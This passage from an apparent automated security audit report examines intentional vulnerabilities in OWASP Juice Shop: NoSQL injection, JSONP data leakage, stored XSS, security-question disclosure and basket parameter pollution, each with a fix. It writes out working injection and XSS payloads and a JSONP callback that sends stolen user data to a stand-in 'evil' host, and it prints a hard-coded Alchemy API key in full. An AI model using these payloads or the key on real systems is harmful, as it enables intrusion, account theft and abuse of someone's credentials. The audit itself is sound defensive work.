**D. Sink engine:** `reviewsCollection` is a MarsDB (`marsdb`) collection — a Minimongo clone. `DocumentMatcher.js:239-240` shows `compileValueSelector` calls `isOperatorObject(valueSelector)` → if the value is an object like `{$gt:""}` or `{$ne:null}`, it dispatches to `operatorBranchedMatcher` (operator semantics), exactly as Mongo would. So `{_id:{$gt:""}}` matches arbitrary documents rather than equality. The injection is genuine, not theoretical.

An authenticated user can therefore POST `{"id":{"$gt":""}}` to match a review they never named, then mutate its `likesCount`/`likedBy`. This is a real NoSQL operator-injection (the intentional Juice Shop "forged/like review" class of challenge), reachable by any low-privileged authenticated user, with no upstream control closing the path. Impact is limited integrity manipulation of review documents (and minor read of another review's `likedBy` emails); no auth bypass or full data compromise.

### 48. [MEDIUM] Hard-coded Alchemy RPC API key embedded in source
**Class:** CWE-798: Use of Hard-coded Credentials
**CWE:** CWE-798: Use of Hard-coded Credentials - https://cwe.mitre.org/data/definitions/798.html
**File:** `routes/nftMint.ts:16-16`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)
**Also at:** `routes/web3Wallet.ts:18`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
The WebSocketProvider URL on line 16 contains a static Alchemy project API key (FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJ). Because the file is shipped in the distributed package and source repo, the secret is exposed to every consumer. There is no rotation, no environment-variable injection, and no vault retrieval — the key is the production value.

#### Impact
The Alchemy API key for the Sepolia endpoint is committed in clear text. Anyone with read access to the package (it ships as an npm/CLI distribution) can extract the key and consume the project's Alchemy quota, incur billing, or pivot to the associated Alchemy account, affecting the project owner.

#### Exploit scenario
An attacker installs the public npm package or clones the repo, greps for 'alchemy.com/v2', extracts the API key, and replays it against Alchemy's API to drain the rate limit/credits tied to the owner's account.

#### Preconditions
- Read access to the shipped source/package (public)

```
const provider = new WebSocketProvider('wss://eth-sepolia.g.alchemy.com/v2/FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJ')
```

#### How to fix
Never hard-code third-party API keys. Load the Alchemy key from an environment variable or secrets manager at runtime and rotate the exposed key immediately. Replace the literal URL on line 16 with a config lookup.

**Exploitability:** Hard-coded Alchemy RPC key shipped in package; third-party quota/abuse, low local impact. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — real hardcoded Alchemy (Sepolia) RPC key shipped in public source/package; no env/vault injection; impact limited to credential disclosure + credit/rate-limit drain on owner's account

**Analysis**

**A. The sink (routes/nftMint.ts:16)** — Confirmed verbatim. A literal Alchemy API key (`FZDapFZSs1l6yhHW4VnQqsi18qSd-3GJ`) is hardcoded into the `WebSocketProvider` URL. No `process.env`, no config lookup, no vault retrieval. The scanner read the code correctly (right file, line, class).

**B. Reachability / exposure** — Two independent paths:
- The secret is exposed simply by shipping the source — Juice Shop is a public repo and published npm package. Precondition "read access to public source" is trivially met; no runtime entry point even needed.
- The route is wired at `server.ts:594` (`GET /rest/web3/nftMintListen`) with **no `isAuthorized()` guard** (contrast lines 589–590 which have it), and is called from the frontend faucet component. So it's also unauth-reachable at runtime.

**C. Defence search** — None. The value is a plain string literal, no env injection, no rotation, no KMS/Vault. The out-of-scope exception in category B ("placeholder secrets … when the prod value is injected from Vault/HSM/KMS") explicitly does **not** apply — there is no injection; the literal *is* the shipped value.

**D. Probe** — This is not a planted challenge. The `nftMintChallenge` tracks the `HoneyPotNFT.sol` smart-contract honeypot (data/static/web3-snippets), not this RPC key. The key leak is incidental, real, and not part of any intended vulnerability snippet.

**Impact calibration** — It is a genuine exposed credential, so this is a true finding, not noise (there's a concrete path: grep package → extract key → replay against Alchemy → drain the owner's compute-unit quota). But impact is bounded: it's a **Sepolia testnet** RPC key. No app-data confidentiality, no integrity, no code execution — worst case is rate-limit/credit exhaustion on the owner's Alchemy account plus disclosure of one low-value credential.

Confirmed present, shipped publicly, no upstream control. The scanner is correct.

### 49. [MEDIUM] JSONP callback enables cross-site exfiltration of user secrets
**Class:** CWE-1385
**CWE:** CWE-1385 - https://cwe.mitre.org/data/definitions/1385.html
**File:** `routes/currentUser.ts:49-54`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
Lines 49-54 switch to res.jsonp(response) when req.query.callback is defined. JSONP responses execute in the requesting page's origin, bypassing the same-origin policy (XSSI). Coupled with the arbitrary field projection (lines 17-26), an external origin can request password/totpSecret. The cookie-based session token is sent by the browser on the cross-site <script> include, so no CSRF token shields this read.

#### Impact
Because the response is emitted via res.jsonp() with an attacker-chosen callback name whenever ?callback= is present, a malicious third-party web page can load this endpoint as a <script> tag. The victim's session cookie is sent automatically, and the attacker's callback function captures the returned user object cross-origin—combined with the unrestricted `fields` parameter this leaks the victim's password hash and TOTP secret to any website.

#### Exploit scenario
Attacker hosts a page with <script src="https://victim-shop/rest/user/whoami?fields=password,email&callback=steal"></script> and defines function steal(o){fetch('//evil/c?d='+btoa(JSON.stringify(o)))}. When a logged-in victim visits, their browser sends the session cookie, the server returns steal({user:{password:'<hash>',email:'...'}}), and the attacker harvests the credentials cross-origin.

#### Preconditions
- Victim is logged in and visits an attacker-controlled page
- Browser/cookie SameSite policy permits cross-site cookie send

```
if (req.query.callback === undefined) {
  res.json(response)
} else {
  challengeUtils.solveIf(challenges.emailLeakChallenge, () => { return true })
  res.jsonp(response)
}
```

#### How to fix
Remove the JSONP branch (res.jsonp) for an endpoint returning sensitive user data, or strictly restrict it to non-sensitive fields and set SameSite=strict on the auth cookie; ensure responses with secret fields are only served as application/json with same-origin checks.

**Exploitability:** JSONP callback enables cross-origin read of secrets (with [37]); AC:H and UI:R reduce real-world likelihood. Picking lower tier. ~CVSS 6.x Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — JSONP endpoint projects arbitrary user.data fields (password hash, totpSecret) cross-origin with no Origin/CSRF/allow-list defence; confirmed by source and frisby test. Practical cross-site theft is dampened by default SameSite=Lax (browser-side, not app-enforced), which raises AC but doesn't fully close the path.

**Investigation**

**A. Sink (routes/currentUser.ts:49-54).** Confirmed verbatim. When `req.query.callback` is defined, the handler emits `res.jsonp(response)` — wrapping the response in an attacker-named callback that executes in the including page's origin (XSSI). It also solves the `emailLeakChallenge`, confirming this is a deliberate planted vuln.

**Field projection (lines 17-37).** Confirmed: `?fields=a,b,c` copies *arbitrary* keys straight off `user.data` with no allow-list. The only filter is `!== undefined`.

**B. Data source.** `user` comes from `security.authenticatedUsers.get(req.cookies.token)`. In `login.ts:22`, `authenticatedUsers.put(token, user)` stores the object built from `SELECT * FROM Users` (`utils.queryResultToJson`), so `user.data` carries `password` (hash) and `totpSecret` (models/user.ts:24,29). So `?fields=password,totpSecret` returns those secrets — and the frisby test `userApiSpec.ts:350-368` *explicitly* confirms `?fields=id,email,password` returns the password hash with status 200. The leak is real and confirmed.

**External entry point.** `server.ts:553` mounts `GET /rest/user/whoami` with `updateAuthenticatedUsers()` (network-reachable). Auth is via `req.cookies.token`.

**C/D. Defences probed.**
- No CSRF token, no `Origin`/`Referer` check, no `X-Content-Type-Options` enforcement on this route.
- No allow-list on `fields` — secrets are freely projectable.
- **The one real mitigant:** the cross-site exfiltration vector depends on the browser sending `token` cookie on a cross-site `<script>` include. `res.cookie('token', token)` (insecurity.ts:187) sets **no `SameSite` attribute**, so modern browsers default to `SameSite=Lax`, which does **not** attach cookies to cross-site subresource (`<script src>`) requests. That substantially breaks the described cross-origin theft on current browsers (the finding itself lists this as a precondition). It does NOT close the path for legacy browsers or any client where the cookie is `SameSite=None`, and the app makes zero server-side effort to prevent the JSONP-XSSI pattern or the secret projection.

**Assessment**

The underlying application weakness is genuine and confirmed in source: a JSONP endpoint with no Origin/CSRF defence that will serialize the user's password hash and TOTP secret into a cross-origin-includable script. The scanner correctly read the sink, class, and file. The cross-site cookie-send precondition is mitigated by modern `SameSite=Lax` defaults (raising attack complexity), but this is a client-side default rather than an application control, and the app neither sets it nor otherwise blocks the pattern. Given a real, reachable sink exposing high-value secrets, I confirm it.

### 50. [MEDIUM] NoSQL injection via $where string concatenation of route param
**Class:** CWE-943
**CWE:** CWE-943 - https://cwe.mitre.org/data/definitions/943.html
**File:** `routes/showProductReviews.ts:26-30`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
req.params.id flows directly into a MongoDB $where query via string concatenation at line 30 (`'this.product == ' + id`). When the noSqlCommandChallenge is enabled, id is set to utils.trunc(req.params.id, 40) — an arbitrary string (only length-limited, not validated/escaped) — so the attacker controls part of the evaluated JavaScript predicate. The $where operator executes the resulting string as JavaScript on every document, and the in-file global.sleep() helper makes time-based blind injection trivially observable. Even with the 40-char truncation, payloads such as `0;sleep(2000)` fit and execute.

#### Impact
An unauthenticated attacker can inject arbitrary JavaScript into a MongoDB $where clause, enabling server-side JS execution within the database engine. This permits time-based blind data exfiltration and database-side denial of service. Any visitor hitting the product-reviews endpoint can exploit it.

#### Exploit scenario
Attacker requests GET /rest/products/<payload>/reviews with id = `0||sleep(2000)//` (or `1==1;sleep(2000)`). The $where becomes `this.product == 0||sleep(2000)//`, MongoDB evaluates the JS, the request blocks ~2s confirming injection, and the attacker iterates boolean/time-based queries to exfiltrate document contents. Larger logic such as returning all reviews regardless of product is also achievable.

#### Preconditions
- noSqlCommandChallenge enabled (default in Juice Shop), making id a string rather than a coerced Number

```
const id = !utils.isChallengeEnabled(challenges.noSqlCommandChallenge) ? Number(req.params.id) : utils.trunc(req.params.id, 40)
...
db.reviewsCollection.find({ $where: 'this.product == ' + id })
```

#### How to fix
Never build $where clauses from user input. Replace the $where query with a structured equality filter on a numeric product id: `reviewsCollection.find({ product: Number(req.params.id) })`, rejecting non-numeric ids at the boundary. Remove the global.sleep helper which exists only to enable the injection.

**Exploitability:** Unauthenticated NoSQL $where injection in showProductReviews; time-based blind feasible within 40 chars. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauthenticated GET route concatenates truncated-but-unescaped route param into MarsDB `$where` JS evaluation; truncation doesn't neutralize `sleep()`/boolean payloads.

All elements confirmed:

- **Sink (A):** Line 30 concatenates `id` directly into a MongoDB-style `$where` string. `MarsDB` (`data/mongodb.ts`) implements `$where` by evaluating the string as JavaScript against each document — `global.sleep()` is defined in-file precisely to make time-based blind injection observable. The scanner read the code correctly.
- **Entry point (B):** `server.ts:587` registers `GET /rest/products/:id/reviews` with **no auth middleware** (unlike the sibling PATCH/POST routes which use `security.isAuthorized()`). Unauthenticated, network-reachable. `req.params.id` is fully attacker-controlled.
- **Defences (C/D):** When `noSqlCommandChallenge` is enabled (default), `id = utils.trunc(req.params.id, 40)`. `trunc` only strips CR/LF and caps length at 40 chars (`lib/utils.ts:59`) — no escaping, no type coercion, no allow-list. A payload like `0;sleep(2000)` or `1==1||true` fits in 40 chars and slips straight through. The `Number()` coercion path is disabled in the default configuration. No upstream control closes the path.

This is a deliberately planted Juice Shop challenge (`noSqlCommandChallenge`), but per the task it is a real, externally-reachable, undefended injection sink — TRUE_POSITIVE.

Impact: JS predicate executes in the MarsDB matcher context, enabling boolean/time-based blind extraction of review documents and bypass of the product filter (read reviews regardless of product). Confidentiality is limited (reviews collection, not credentials/full DB), integrity unaffected via `find`, availability impact is bounded (sleep capped at 2000ms). Scope unchanged — execution stays within the app's own component.

### 51. [MEDIUM] Unauthenticated security-question disclosure for any user email
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/securityQuestion.ts:9-23`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
The handler reads the attacker-controlled `email` query parameter (line 10) and uses it directly to look up the matching user's SecurityAnswer/SecurityQuestion (lines 12-19). There is no authentication and no check that the caller owns the supplied email address; ownership/tenant is never verified for the resource being read. Because the email is varied freely by the caller, the endpoint can be iterated over every user, returning each victim's security question. The result is returned verbatim in the JSON response (line 20).

#### Impact
An anonymous attacker can retrieve the security question associated with any registered user's email address. Combined with the forgot-password flow this leaks the exact knowledge-based credential challenge for arbitrary accounts, aiding targeted account takeover and user enumeration.

#### Exploit scenario
An unauthenticated attacker sends GET /rest/user/security-question?email=victim@example.com and receives {"question":{...}} containing the victim's chosen security question. The attacker repeats this across an email list to harvest every account's recovery challenge, then drives the password-reset flow to take over accounts whose answers can be guessed or socially engineered.

#### Preconditions
- Attacker knows or can guess/enumerate target user email addresses

```
const email = query.email
const answer = await SecurityAnswerModel.findOne({
  include: [{ model: UserModel, where: { email: email?.toString() } }]
})
if (answer != null) {
  const question = await SecurityQuestionModel.findByPk(answer.SecurityQuestionId)
  res.json({ question })
}
```

#### How to fix
The endpoint should not expose another user's recovery challenge to an unauthenticated, unverified caller. Bind the security-question lookup to the authenticated session/reset token in securityQuestion.ts (line 12-19), or only surface the question after the requester proves control of the email (e.g., a reset-token round trip), rather than returning it for any email passed in the query string.

**Exploitability:** Unauthenticated security-question disclosure for any email; enables targeted reset brute force. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — unauthenticated, no ownership check; arbitrary-email security-question disclosure is externally reachable and undefended, though impact is limited to the question text (not the answer), so low severity

Confirmed the code and routing. Key findings:

- **routes/securityQuestion.ts** (lines 9-23): Handler reads `query.email` directly, joins `SecurityAnswerModel` → `UserModel where email`, and returns the matched `SecurityQuestionModel` via `res.json({ question })`. No auth, no ownership check. Scanner read the code correctly.
- **server.ts:552**: `app.get('/rest/user/security-question', securityQuestion())` — registered with **no** `isAuthorized()`/`denyAll()` middleware (contrast with lines 322-356 where protected routes get explicit guards). No upstream auth `app.use` covers `/rest/user/security-question` either.
- **Reachability**: Externally reachable, unauthenticated. The Angular `forgot-password.component.ts` calls it with a user-typed email — confirming it's a live production path.

Assessment against scope:
- (B) External unauth entry point reached. (C)/(D) No auth gate, no ownership/tenant check, no rate limit on this route (the rate-limit at server.ts:314 covers `/rest/user/reset-password`, not this). Nothing closes the path.
- **Impact calibration**: Only the security *question text* is disclosed — not the answer. So this is a limited-confidentiality info leak enabling enumeration of recovery challenges across all emails. It does **not** by itself grant takeover (the answer is never returned), so the description's "account takeover" chain overstates impact. No integrity/availability impact.
- **Caveat**: Email-based forgot-password flows inherently surface the question to whoever enters the email; this borders on "working as designed." But disclosing it to any unauthenticated caller for arbitrary emails with no ownership confirmation is a genuine, externally-reachable information disclosure, and the finding's code-level claim is accurate.

Net: real, externally-reachable, undefended info disclosure — but limited confidentiality only (question, not answer).

### 52. [MEDIUM] Stored XSS via unsanitized true-client-ip header
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `routes/saveLoginIp.ts:15-29`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The handler reads the fully attacker-controlled HTTP request header `true-client-ip` (line 15). When the httpHeaderXssChallenge is enabled (line 19), the code only runs a `solveIf` equality comparison and never calls `security.sanitizeSecure`; the unmodified header value falls through to line 29 where it is written to the user record's `lastLoginIp` column via `user.update`. The raw value is therefore persisted to the database without encoding or sanitization and later surfaced to clients, producing a stored XSS sink. The sanitize branch (line 22) is only taken when the challenge is disabled, so in the default vulnerable configuration the input is stored verbatim.

#### Impact
An authenticated attacker can persist arbitrary HTML/JavaScript in their stored lastLoginIp field by sending a crafted True-Client-IP header. When this value is rendered back (e.g. last-login-IP display), the script executes in the victim's/admin's browser, enabling session theft or account actions.

#### Exploit scenario
An authenticated user issues any request hitting saveLoginIp (e.g. after login) with header `True-Client-IP: <iframe src="javascript:alert(document.cookie)">`. The value bypasses sanitization and is stored on their user record's lastLoginIp. When the value is rendered in the application UI, the injected script executes in the viewer's browser context.

#### Preconditions
- Attacker has a valid (any low-privilege) authenticated session
- httpHeaderXssChallenge enabled (default in this build), bypassing sanitizeSecure
- The stored lastLoginIp value is later rendered to a browser without output encoding

```
let lastLoginIp = req.headers['true-client-ip']
...
if (utils.isChallengeEnabled(challenges.httpHeaderXssChallenge)) {
  challengeUtils.solveIf(...)
} else {
  lastLoginIp = security.sanitizeSecure(lastLoginIp ?? '')
}
...
const updatedUser = await user?.update({ lastLoginIp: lastLoginIp?.toString() })
```

#### How to fix
Always sanitize/encode the true-client-ip header value before persistence regardless of challenge state. Move the `security.sanitizeSecure(...)` call out of the else branch (line 22) so it applies unconditionally, or HTML-encode lastLoginIp at every render site.

**Exploitability:** Stored XSS via true-client-ip header persisted to lastLoginIp; surfaced later. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — unsanitized `true-client-ip` header persisted in default config and rendered via `bypassSecurityTrustHtml`; reachable network route, no upstream control closes the path (impact tempered: value only renders to the same user's browser).

**Analysis**

**A. The sink (saveLoginIp.ts:15-29):** Confirmed exactly as reported. `req.headers['true-client-ip']` (fully attacker-controlled) is read, and when `httpHeaderXssChallenge` is enabled the code only runs `solveIf` (an equality check, no mutation) — `sanitizeSecure` is skipped. The raw value is persisted via `user.update({ lastLoginIp })`.

**B. External entry point:** `app.get('/rest/saveLoginIp', saveLoginIp())` (server.ts:572) — a live network route. Requires an authenticated session (`security.authenticatedUsers.from(req)` ⇒ `PR:L`), but any low-priv user qualifies. Reachable.

**C. Defence search:**
- `sanitizeSecure` (insecurity.ts:57, recursive `sanitizeHtml`) *would* strip the iframe — but it is in the `else` branch, only reached when the challenge is **disabled**. In the default/vulnerable build the sanitize branch is never taken. No allow-list, no length/type constraint on the header.
- **Rendering sink confirmed:** `currentUser.ts:34` exposes `lastLoginIp` → it lands in the JWT `data` → frontend `last-login-ip.component.ts:36` does `bypassSecurityTrustHtml(\`<small>${lastLoginIp}</small>\`)` bound to `[innerHTML]` (last-login-ip.component.html:7). Angular's encoding is explicitly bypassed. A genuine XSS sink.

**D. Probing:** The only mitigation (`sanitizeSecure`) is gated off by the active challenge flag, so the path is fully open in the default config. This is the deliberately planted `httpHeaderXssChallenge`.

**Caveat affecting severity (not validity):** `lastLoginIp` is rendered from the *viewer's own* JWT, and `saveLoginIp` only updates the caller's own user record. So the payload executes in the attacker's own browser — practically self-XSS rather than cross-user stored XSS. The server-side missing-sanitization sink is real and correctly identified (right file, right class, right sink), but the cross-victim impact the scenario implies is overstated. Limited C/I impact, no cross-user delivery primitive found.

The scanner read the code correctly: external entry point reached, default config bypasses sanitization, output rendered via `bypassSecurityTrustHtml`. Real injection sink → TRUE_POSITIVE, scored as stored XSS with limited impact.

### 53. [MEDIUM] Unescaped subtitle content injected into video page HTML
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `routes/videoHandler.ts:66-69`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
promotionVideo() compiles the pug template (line 66-67) and then, AFTER compilation, performs a raw string replace (line 68) substituting the placeholder script tag with '<script id="subtitle" ...>' + subs + '</script>'. subs is the full text of a file read in getSubsFromFile() (line 77-81) from 'frontend/dist/frontend/assets/public/videos/' + subtitles, where the subtitles name comes from config 'application.promotion.subtitles'. The file contents are concatenated into the response with no HTML/entity encoding and without VTT sanitization, so any HTML/script markup in the subtitle file breaks out of the script element and runs in the browser. The page is served by a public GET route with no authentication, so every viewer is affected. The challenge solveIf on line 55 confirms the application explicitly treats a </script><script> payload in the subtitle as the exploit condition.

#### Impact
Any visitor of the promotion-video page receives whatever bytes the configured subtitle (.vtt) file contains, injected verbatim into the rendered HTML inside a <script id="subtitle"> tag. If the subtitle file content includes markup such as </script><script>alert(`xss`)</script>, it executes in every viewer's browser, enabling session/token theft or actions on behalf of the victim.

#### Exploit scenario
An attacker who can influence the subtitle file (or the deployed default that ships the payload) places the line `</script><script>alert(document.cookie)</script>` in the .vtt file. A victim opens the promotion video page; the server emits that markup unescaped inside the subtitle script tag, closing it early and executing the attacker's script in the victim's session context.

#### Preconditions
- Subtitle file content (or the configured subtitles path) is attacker-influenceable
- Victim loads the public promotion-video page

```
const fn = pug.compile(template)
let compiledTemplate = fn()
compiledTemplate = compiledTemplate.replace('<script id="subtitle"></script>', '<script id="subtitle" type="text/vtt" data-label="English" data-lang="en">' + subs + '</script>')
res.send(compiledTemplate)
```

#### How to fix
The security property: subtitle text emitted into HTML must be HTML-encoded or carried via a safe transport (e.g. served as a separate text/vtt resource, not inlined). At line 68 in routes/videoHandler.ts, run subs through entities.encode(subs) before concatenation, or set the subtitle text via a JSON/data attribute consumed by client JS rather than raw HTML injection.

**Exploitability:** Subtitle content injected post-compile into video page; controlled by config-named file, public route. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unescaped subtitle file contents concatenated into an inline `<script>` on the public, unauth `/promotion` route; attacker plants payload via zip-slip file upload, executes in every viewer's browser

**Investigation Summary**

**A. Code at lines 66–69:** Confirmed verbatim. After pug compilation, line 68 does a raw string replace injecting `subs` directly between `<script id="subtitle" ...>` and `</script>` with **no encoding**. Note line 59 deliberately uses `entities.encode()` for `_title_`, but `subs` on line 68 gets no such treatment — confirming the sink is real and the missing encoding is selective.

**B. Call chain to external entry point:**
- `promotionVideo()` is wired to `app.get('/promotion', ...)` in server.ts:608 — a **public GET route with no auth middleware** (compare `/profile` directly below which has `security.updateAuthenticatedUsers()`).
- `subs` = full contents of `frontend/dist/.../videos/<subtitles>` where `<subtitles>` defaults to `owasp_promo.vtt`.
- The attacker-controlled vector is **the file contents**, not the HTTP request. The Cypress test (complain.spec.ts:150–162) and architecture notes confirm the intended chain: **zip-slip path traversal via `handleZipFileUpload` (an UNAUTH/low-priv-reachable file upload)** overwrites `owasp_promo.vtt` with `</script><script>alert(\`xss\`)</script>`. Reached an external entry point. ✔

**C. Hunt for defences:**
- No HTML/entity encoding on `subs` (line 68 — unlike line 59).
- No VTT sanitization.
- No auth gate on `/promotion`.
- `extractFilename` is applied to the *video* path (line 85) but **not** to subtitle content.
- The route is live in default config, not test-only or feature-flagged.

**D.** No defence exists to probe — the sink is wide open. The `solveIf` on line 55 confirms the maintainers treat the `</script><script>` breakout as the exploit condition.

**Verdict:** Genuine stored/persistent XSS. External entry point reached (zip upload → overwrites subtitle file → victim loads public `/promotion` → script executes in victim's session). This is an intentionally planted Juice Shop challenge, but per scope rules an intentional, demonstrably-exploitable vuln with a real attacker path and real impact is a TRUE_POSITIVE. Impact is XSS (limited C/I, no A), scope crosses into the victim's browser context; planting requires the file-upload path (low-priv) and the victim must load the page (UI:R).

### 54. [MEDIUM] Stored XSS via unsanitized username on profile update
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `routes/updateUserProfile.ts:33-33`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
req.body.username is taken directly from the request body and written to the persisted UserModel via user.update({ username: req.body.username }) with no validation, length check, allow-list, or HTML encoding at the boundary. The value is then re-serialized into the JWT (security.authorize) and stored in authenticatedUsers, and the username is emitted to HTML in other parts of the app without escaping, yielding stored XSS.

#### Impact
An authenticated user can set their username to an HTML/JavaScript payload, which is persisted and later rendered unescaped wherever the username is displayed (e.g., admin views, profile pages). This results in stored cross-site scripting that executes in another user's or an administrator's browser session.

#### Exploit scenario
An attacker logs in, sends PUT/POST to the profile endpoint with body {"username":"<img src=x onerror=alert(document.cookie)>"}. The payload is stored on their account. When an administrator or other user views a page that renders this username unescaped, the script runs in that victim's session, allowing cookie/token theft or actions on their behalf.

#### Preconditions
- Attacker has a valid authenticated session (token cookie)
- Username is rendered somewhere without HTML encoding (true in Juice Shop)

```
const savedUser = await user.update({ username: req.body.username })
```

#### How to fix
Validate and encode req.body.username at this boundary before persisting: enforce an allow-list/length limit and reject HTML control characters, or HTML-encode on output. Add server-side input validation at routes/updateUserProfile.ts:33 instead of trusting the raw body value.

**Exploitability:** Stored XSS via unsanitized username on profile update; renders unescaped elsewhere. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — reachable authenticated sink; the only boundary control (sanitizeLegacy) is intentionally regex-bypassable per its own unit test, leaving real stored XSS

I have enough to decide. Let me confirm my key finding about the sanitizer bypass:

The test file proves `sanitizeLegacy('<<a|ascript>alert(\`xss\`)</script>')` returns `'<script>alert(\`xss\`)</script>'` — the regex `replace(/<(?:\w+)\W+?[\w]/gi, '')` strips only one nested layer, leaving a fully working `<script>` tag. This is the classic intentional Juice Shop "Persisted XSS" challenge (`persistedXssUserChallenge`, `data/static/challenges.yml:254`).

**Analysis**

**A. Sink (line 33):** Confirmed accurate. `user.update({ username: req.body.username })` writes request body directly to the model.

**B. Call chain:** `server.ts:612` registers `app.post('/profile', updateUserProfile())`. Reachable by any authenticated user (token cookie checked at line 13). Registration is open in Juice Shop → low-privilege external entry point. ✔ reachable.

**C. Defenses — the scanner's central claim is wrong:** The scanner states "no validation, length check, allow-list, or HTML encoding at the boundary." That is false — `models/user.ts:44-51` has a Sequelize `set()` hook on `username` that sanitizes every write (both `/profile` and the finale `/api/Users` route go through it).

**D. Probing the defense:** Two branches:
- Challenge disabled → `sanitizeSecure` (recursive `sanitize-html`) — fully neutralizes. 
- Challenge enabled (default in this deliberately-vulnerable app) → `sanitizeLegacy`, whose regex is intentionally bypassable. The `<<a|ascript>` payload survives as a live `<script>` (proven by `test/server/insecuritySpec.ts:155`). The exact payload the scanner cited (`<img src=x onerror=...>`) would be partially mangled, but a functionally equivalent bypass passes through.

So the defense does **not** fully close the path. The username is then re-serialized into the JWT/`authenticatedUsers` and rendered unescaped elsewhere (the documented stored-XSS challenge). The sink, file, line, and vulnerability class are all correct; only the "zero sanitization" detail was mis-stated, and the residual control is bypassable.

Net: an authenticated, low-privilege attacker stores script that executes in a victim's browser when the username is rendered — a genuine stored XSS. Standard stored-XSS scoring: network, low complexity, requires an account (PR:L), victim must view the page (UI:R), crosses into the victim's browser session (S:C), limited C/I impact.

### 55. [MEDIUM] HTTP parameter pollution bypasses basket ownership check
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/basketItems.ts:33-42`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
The raw request body is parsed into ordered key/value pairs (line 18). The ownership guard compares the authenticated user's basket id against basketIds[0] (line 34), but the BasketItem that is persisted uses basketIds[basketIds.length - 1] (line 39). When the body contains two BasketId fields — the attacker's own bid first, the victim's bid last — the check at line 34 passes (first value matches the session) while the mutation writes to the victim's basket (last value). The challenge marker on line 42 confirms the mismatch is observable.

#### Impact
An authenticated user can add items to another user's shopping basket. The ownership check inspects the FIRST BasketId in the body while the item is actually saved against the LAST BasketId, so supplying two BasketId values defeats the authorization check.

#### Exploit scenario
A logged-in attacker POSTs to /api/BasketItems with body {"ProductId":1,"BasketId":<ownBid>,"BasketId":<victimBid>,"quantity":1}. The first BasketId equals their own bid so the 401 branch is skipped, but the saved basket item is bound to the victim's basket id, injecting items into another user's basket.

#### Preconditions
- Attacker has a valid authenticated session
- Attacker knows or guesses a victim BasketId

```
if (user && basketIds[0] && basketIds[0] !== 'undefined' && Number(user.bid) != Number(basketIds[0])) {
  res.status(401).send(...)
} else {
  const basketItem = { ... BasketId: basketIds[basketIds.length - 1], ... }
```

#### How to fix
